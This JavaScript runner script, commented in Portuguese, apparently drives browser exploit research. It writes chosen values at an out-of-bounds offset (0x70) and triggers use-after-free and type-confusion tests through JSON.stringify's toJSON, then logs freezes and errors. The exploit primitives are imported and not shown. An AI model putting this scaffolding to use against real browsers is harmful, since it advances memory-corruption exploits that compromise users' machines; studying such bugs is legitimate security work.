// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
// Atualize para a nova função de teste
import { executeUAFTypeConfusionTestWithValue, currentCallCount_for_UAF_TC_test, detailed_toJSON_for_UAF_TC_test } from './testJsonTypeConfusionUAFSpeculative.mjs';
import { OOB_CONFIG } from '../config.mjs'; 
import { toHex } from '../utils.mjs';


async function runUAFTypeConfusionValueTests() {
    const FNAME_RUNNER = "runUAFTypeConfusionValueTests";
    logS3(`==== INICIANDO Testes UAF/TC com Valores Variados em 0x70 (COM PP Detalhada) ====`, 'test', FNAME_RUNNER);

    const criticalOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70

    // Valores que NÃO causaram o TypeError imediato, para ver o que acontece dentro da toJSON detalhada
    const valuesToInvestigate = [
        { desc: "Val_0000", val: 0x00000000 },
        { desc: "Val_AAAA", val: 0x41414141 },
        { desc: "Val_0001", val: 0x00000001 },
        // Adicionar 0xFFFFFFFF aqui também para ver se o comportamento mudou de TypeError para algo dentro da toJSON
        { desc: "Val_FFFF", val: 0xFFFFFFFF }, 
        // Poderíamos adicionar aqui IDs de estrutura conhecidos se os tivermos e quisermos testar type confusion direto
        // { desc: "Val_StructID_Array", val: parseInt(KNOWN_STRUCTURE_IDS.TYPE_ARRAY_BUFFER, 16) || 0xDEADBEEF },
    ];

    for (const valueTest of valuesToInvestigate) {
        // Garantir que o contador de chamadas da toJSON seja resetado para cada teste de valor
        // A função executeUAFTypeConfusionTestWithValue já faz isso internamente.

        const testDescription = `UAF_TC_Test_${valueTest.desc}_Offset0x70`;
        logS3(`\n--- Executando Teste UAF/TC: ${testDescription} ---`, 'subtest', FNAME_RUNNER);
        
        // A função detailed_toJSON_for_UAF_TC_test é definida em testJsonTypeConfusionUAFSpeculative.mjs
        // e usada implicitamente por executeUAFTypeConfusionTestWithValue se não passarmos outra.
        // No entanto, para clareza, vamos nos certificar que a lógica em executeUAF... usa a detailed_toJSON_for_UAF_TC_test.
        // A versão atual de executeUAFTypeConfusionTestWithValue usa 'detailed_toJSON_for_UAF_TC_test'
        // que foi definida no mesmo arquivo. Para que isso funcione, detailed_toJSON_for_UAF_TC_test
        // precisa ser a função efetivamente usada quando Object.defineProperty é chamado.
        // A forma como foi escrito (passando a função como argumento) era melhor.
        // Vou reverter para a passagem explícita da função `detailed_toJSON_for_UAF_TC_test`.
        // No entanto, executeUAFTypeConfusionTestWithValue já faz referência a detailed_toJSON_for_UAF_TC_test.
        // Vamos corrigir o script anterior para usar o parâmetro toJSONFunctionToUse corretamente.
        // A versão anterior de executeTypeErrorInvestigationTest tinha um parâmetro toJSONFunctionToUse.
        // A nova executeUAFTypeConfusionTestWithValue *não* tem esse parâmetro, ela usa detailed_toJSON_for_UAF_TC_test internamente.
        // Isto está correto para o objetivo atual.

        let result = await executeUAFTypeConfusionTestWithValue(
            testDescription,
            valueTest.val
        );

        if (result.potentiallyFroze) {
            logS3(`   RESULTADO ${testDescription}: CONGELAMENTO POTENCIAL. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
        } else if (result.errorOccurred) {
            logS3(`   RESULTADO ${testDescription}: ERRO JS CAPTURADO. Chamadas toJSON: ${result.calls}`, "warn", FNAME_RUNNER);
        } else {
            logS3(`   RESULTADO ${testDescription}: Completou sem congelar/erro JS. Chamadas toJSON: ${result.calls}`, "good", FNAME_RUNNER);
            logS3(`      Stringify Result: ${String(result.stringifyResult).substring(0,200)}`, "info", FNAME_RUNNER);
        }

        await PAUSE_S3(MEDIUM_PAUSE_S3);
        logS3(`   Título da página após teste ${testDescription}: ${document.title}`, "info");
    }

    logS3(`==== Testes UAF/TC com Valores Variados CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_UAF_TC_ValueTests';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Testes UAF/TC com Valores Variados em 0x70 ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Testes UAF/TC";
    
    await runUAFTypeConfusionValueTests();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Testes UAF/TC com Valores Variados) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
}
